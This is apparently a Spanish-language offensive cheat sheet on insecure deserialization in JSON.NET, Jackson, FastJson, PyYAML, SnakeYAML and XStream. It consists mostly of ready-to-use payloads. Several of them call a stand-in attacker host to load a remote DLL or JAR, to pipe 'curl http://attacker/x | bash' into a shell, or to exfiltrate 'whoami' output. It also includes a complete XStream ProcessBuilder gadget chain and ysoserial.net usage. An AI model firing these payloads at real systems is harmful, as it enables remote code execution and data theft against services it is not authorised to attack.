---
aliases:
  - JSON Polymorphic
  - YAML Eval
  - XML Deserialization
  - Jackson
  - JSON.NET TypeNameHandling
  - FastJson
tags:
  - type/cheatsheet
  - vuln/insecure-deser
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Insecure Deserialization]]'
---
# Insecure Deserialization - Formatos Estructurados

***

## JSON Polymorphic

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Newtonsoft.Json TypeNameHandling | `{"$type":"System.IO.FileInfo, mscorlib","fileName":"path"}` | Si `TypeNameHandling = All / Auto / Objects` → instancia tipos arbitrarios. |
| JSON.NET RCE | `{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"http://attacker/evil.dll"}` | Carga assembly remoto. |
| JSON.NET via System.Windows.Data | Gadget `ObjectDataProvider` | Igual que XAML. |
| Jackson polymorphic (Java) | `["org.springframework.context.support.ClassPathXmlApplicationContext", "http://attacker/spel.xml"]` | Default typing habilitado o `@JsonTypeInfo`. |
| Jackson sub-types CVE-list | CVE-2017-7525, CVE-2017-15095, CVE-2018-7489, CVE-2019-12384, CVE-2020-9546+ | Decenas de gadgets — cada uno bypasea la blacklist anterior. |
| Jackson HikariConfig gadget | `["com.zaxxer.hikari.HikariConfig", {"metricRegistry":"jdbc:mysql:..."}]` | RCE via JDBC. |
| Jackson Logback gadget | `["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:..."}]` | Misma idea. |
| FastJson (Alibaba) | `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/evil","autoCommit":true}` | RCE clásico FastJson 1.2.x. |
| FastJson reference bypass | `{"@type":"L<class>;"}` — formato de referencia Java | Bypass de blacklist de class name. |
| FastJson CVE-2022-25845 | Bypass via `safeMode = false` y class no listada | Listas de gadgets en awesome-fastjson. |
| FastJson auto-type | `{"@type":"...","..."}` con `setAutoTypeSupport(true)` | Bypass siempre disponible. |
| Jackson @class | Equivalente a $type de .NET | Notación distinta misma idea. |
| Jsonnet / Boon | Otras libs Java con polymorphism vulnerable | CVE list propia. |
^deser-fmt-json

### JSON.NET vulnerable config

```csharp
// VULNERABLE — TypeNameHandling != None
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All
};
var obj = JsonConvert.DeserializeObject(userInput, settings);
```

### Workflow exploit JSON.NET

```bash
# Generar payload con ysoserial.net
ysoserial.net.exe -g ObjectDataProvider -f Json.Net -c "calc"

# Resultado: JSON con $type que ejecuta calc.exe al deser
```

___

## YAML Eval

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| PyYAML `yaml.load()` (sin Loader) | `!!python/object/apply:os.system ["id"]` | Pre-PyYAML 5.1 = RCE inmediato. |
| PyYAML moderno (con Loader=yaml.Loader) | Mismo payload — Loader unsafe = RCE. | Solo `SafeLoader` está safe. |
| PyYAML `python/object/new` | `!!python/object/new:type ["x", !!python/tuple [], {"extend": !!python/name:exec}]` | Bypass de filtros básicos. |
| PyYAML object/apply subprocess | `!!python/object/apply:subprocess.check_output [["id"]]` | RCE via subprocess. |
| PyYAML `os.system` clásico | `!!python/object/apply:os.system ["curl http://attacker/x \| bash"]` | Reverse shell. |
| Ruby YAML.load (CVE-2013-0156) | Universal gadget — ver `Insecure Deserialization - Object Injection`. | Rails. |
| Ruby YAML.load Psych < 3.1 | `--- !ruby/object:Gem::Requirement requirements: ...` | Hashicorp / Rails legacy. |
| SnakeYAML (Java) | `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]` | Carga JAR remoto. |
| SnakeYAML CVE-2022-1471 | Versions < 1.33 default Constructor unsafe. | Spring apps típicas. |
| YAML.NET (.NET) | `!System.Diagnostics.Process` con StartInfo | Si UseUnsafeMode habilitado. |
| RemoteCodeExec via PyYAML | `!!python/object/apply:builtins.eval ["__import__('os').system('id')"]` | eval-based bypass. |
^deser-fmt-yaml

### Payload PyYAML completo

```yaml
!!python/object/apply:os.system
- "curl http://attacker.com/$(whoami)"
```

```python
import yaml

payload = '''!!python/object/apply:os.system
- "id > /tmp/pwned"
'''

# Vulnerable
yaml.load(payload, Loader=yaml.Loader)  # RCE

# Safe
yaml.safe_load(payload)  # Raises ConstructorError
```

___

## XML Deserialization

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| XStream (Java) — clásico | `<map><entry><java.beans.EventHandler>...</java.beans.EventHandler></entry></map>` | EventHandler-based RCE. |
| XStream CVE-2021-39139 | Decenas de gadgets — JdkDynamicAggregateTranslator, etc. | Versiones < 1.4.18. |
| XStream con `xstream.fromXML(input)` | Sink primario | Equivalente a readObject pero XML. |
| .NET XmlSerializer | Solo vulnerable si tipos arbitrarios + KnownTypes habilitado | Más restrictivo. |
| .NET DataContractSerializer | Vulnerable si KnownTypes incluye System.* | NetDataContract más laxo. |
| .NET NetDataContractSerializer | Vulnerable like BinaryFormatter | Incluye type metadata. |
| .NET LosFormatter | ViewState legacy | Mismo riesgo que BinaryFormatter. |
| SOAPFormatter | Otra alternativa .NET vulnerable | Histórico. |
| XAML payload (.NET WPF/PresentationFramework) | `<ObjectDataProvider ObjectType="System.Diagnostics.Process" MethodName="Start">...</ObjectDataProvider>` | Con NetDataContractSerializer / XamlReader. |
| Castor XML (Java) | Vulnerable como XStream | Menos común. |
| MarshalSec (Apache Commons) | Tool similar a ysoserial pero para XML/JSON deser | Ver `Insecure Deserialization - Tooling`. |
^deser-fmt-xml

### XStream RCE clásico

```xml
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command><string>id</string></command>
                    </next>
                  </iter>
                </serviceIterator>
              </cipher>
            </is>
          </dataSource>
        </dataHandler>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
  </entry>
</map>
```

(Generar con `marshalsec` para versiones específicas.)

***
